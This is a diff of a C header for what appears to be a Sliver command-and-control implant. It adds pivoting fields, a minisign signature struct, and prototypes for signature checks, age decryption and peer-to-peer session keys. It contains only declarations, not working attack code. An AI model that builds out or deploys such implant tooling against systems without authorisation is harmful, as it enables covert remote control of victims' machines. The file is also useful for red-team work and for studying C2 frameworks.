@@ -13,15 +13,18 @@ typedef struct _GLOBAL_CONFIG GLOBAL_CONFIG, * PGLOBAL_CONFIG;
 
 struct _GLOBAL_CONFIG {
 	CHAR szSessionID[33];
+	CHAR PivotSessionID[16];
 	CHAR szSliverName[33];
 	CHAR szConfigID[33];
 	PBYTE pSessionKey;
+	PBYTE pPeerSessionKey;
 	LPSTR lpRecipientPubKey;
 	LPSTR lpPeerPubKey;
 	LPSTR lpPeerPrivKey;
 	UINT64 uPeerID;
 	UINT64 uEncoderNonce;
 	LPSTR lpServerMinisignPublicKey;
+	LPSTR lpPeerAgePublicKeySignature;
 	DWORD dwMaxFailure;
 	DWORD dwReconnectInterval;
 };
@@ -38,6 +41,15 @@ typedef struct _SLIVER_THREADPOOL {
 	TP_CALLBACK_ENVIRON CallBackEnviron;
 } SLIVER_THREADPOOL, * PSLIVER_THREADPOOL;
 
+typedef struct _SIGNATURE {
+	LPSTR lpUntrustedComment;
+	BYTE SignatureAlgorithm[2];
+	BYTE KeyId[8];
+	BYTE Signature[64];
+	LPSTR lpTrustedComment;
+	BYTE GlobalSignature[64];
+} SIGNATURE, *PSIGNATURE;
+
 typedef LPVOID(WINAPI* CLIENT_INIT)();
 typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
 typedef BOOL(WINAPI* CLIENT_SEND)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
@@ -52,6 +64,8 @@ typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);
 #include "Proxy.h"
 #include "Uri.h"
 #include "Session.h"
+#include "Socket.h"
+#include "Pivot.h"
 
 PBUFFER RegisterSliver
 (
@@ -95,16 +109,63 @@ PENVELOPE UnmarshalEnvelope
 PBUFFER SliverDecrypt
 (
 	_In_ PGLOBAL_CONFIG pConfig,
-	_In_ PBUFFER pCipherText
+	_In_ PBUFFER pCipherText,
+	_In_ BOOL FromServer
 );
 
 PBUFFER SliverEncrypt
 (
 	_In_ PGLOBAL_CONFIG pConfig,
-	_In_ PBUFFER pInput
+	_In_ PBUFFER pInput,
+	_In_ BOOL SendToServer
 );
 
 VOID FreeGlobalConfig
 (
 	_In_ PGLOBAL_CONFIG pConfig
 );
+
+PSIGNATURE DecodeMinisignSignature
+(
+	_In_ LPSTR lpInput
+);
+
+BOOL VerifySign
+(
+	_In_ PMINISIGN_PUB_KEY pPublicKey,
+	_In_ PSIGNATURE pSig,
+	_In_ PBUFFER pMessage
+);
+
+BOOL MinisignVerify
+(
+	_In_ PBUFFER pMessage,
+	_In_ LPSTR lpSignature,
+	_In_ LPSTR lpMinisignServerPublicKey
+);
+
+PBUFFER AgeDecrypt
+(
+	_In_ LPSTR lpRecipientPrivateKey,
+	_In_ PBUFFER pCipherText
+);
+
+PBYTE MarshalWithoutMAC
+(
+	_In_ PSTANZA_WRAPPER pHdr,
+	_In_ PBYTE pHmacKey
+);
+
+PSTANZA_WRAPPER ParseStanza
+(
+	_In_ PBYTE pInputBuffer
+);
+
+PBYTE HeaderMAC
+(
+	_In_ PSTANZA_WRAPPER pHdr,
+	_In_ PBYTE pFileKey,
+	_In_ DWORD cbFileKey
+);
+
+UINT64 GeneratePeerID();
